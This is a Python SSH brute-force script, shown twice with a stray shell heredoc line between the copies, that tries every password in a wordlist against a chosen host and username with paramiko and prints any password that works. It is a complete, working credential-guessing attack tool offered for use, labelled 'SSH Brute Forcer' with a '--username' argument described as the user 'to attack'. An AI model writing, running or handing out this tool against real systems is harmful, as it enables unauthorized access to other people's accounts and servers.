import paramiko
import argparse
from rich.console import Console

console = Console()

def ssh_brute(host, username, wordlist_path, port=22):
    console.print(f"\n[bold cyan][*] Starting SSH brute force on {host}:{port}[/bold cyan]")
    console.print(f"[*] Username: {username}")
    console.print(f"[*] Wordlist: {wordlist_path}\n")

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[red][-] Wordlist not found: {wordlist_path}[/red]")
        return None

    console.print(f"[*] Loaded {len(passwords)} passwords\n")

    for i, password in enumerate(passwords):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username, password=password, timeout=3)
            console.print(f"[bold green][+] PASSWORD FOUND: {password}[/bold green]")
            console.print(f"[bold green][+] SSH login successful for {username}:{password}[/bold green]")
            client.close()
            return password
        except paramiko.AuthenticationException:
            console.print(f"[dim][-] Tried {i+1}/{len(passwords)} — {password}[/dim]")
        except Exception as e:
            pass

    console.print(f"[red][-] Password not found in wordlist.[/red]")
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Brute Forcer")
    parser.add_argument("--host", required=True, help="Target SSH host")
    parser.add_argument("--username", required=True, help="Username to attack")
    parser.add_argument("--wordlist", required=True, help="Path to wordlist")
    parser.add_argument("--port", type=int, default=22, help="SSH port (default: 22)")
    args = parser.parse_args()

    ssh_brute(args.host, args.username, args.wordlist, args.port)
PYEOFcat > ssh_auditor.py << 'PYEOF'
import paramiko
import argparse
from rich.console import Console

console = Console()

def ssh_brute(host, username, wordlist_path, port=22):
    console.print(f"\n[bold cyan][*] Starting SSH brute force on {host}:{port}[/bold cyan]")
    console.print(f"[*] Username: {username}")
    console.print(f"[*] Wordlist: {wordlist_path}\n")

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[red][-] Wordlist not found: {wordlist_path}[/red]")
        return None

    console.print(f"[*] Loaded {len(passwords)} passwords\n")

    for i, password in enumerate(passwords):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username, password=password, timeout=3)
            console.print(f"[bold green][+] PASSWORD FOUND: {password}[/bold green]")
            console.print(f"[bold green][+] SSH login successful for {username}:{password}[/bold green]")
            client.close()
            return password
        except paramiko.AuthenticationException:
            console.print(f"[dim][-] Tried {i+1}/{len(passwords)} — {password}[/dim]")
        except Exception as e:
            pass

    console.print(f"[red][-] Password not found in wordlist.[/red]")
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Brute Forcer")
    parser.add_argument("--host", required=True, help="Target SSH host")
    parser.add_argument("--username", required=True, help="Username to attack")
    parser.add_argument("--wordlist", required=True, help="Path to wordlist")
    parser.add_argument("--port", type=int, default=22, help="SSH port (default: 22)")
    args = parser.parse_args()

    ssh_brute(args.host, args.username, args.wordlist, args.port)
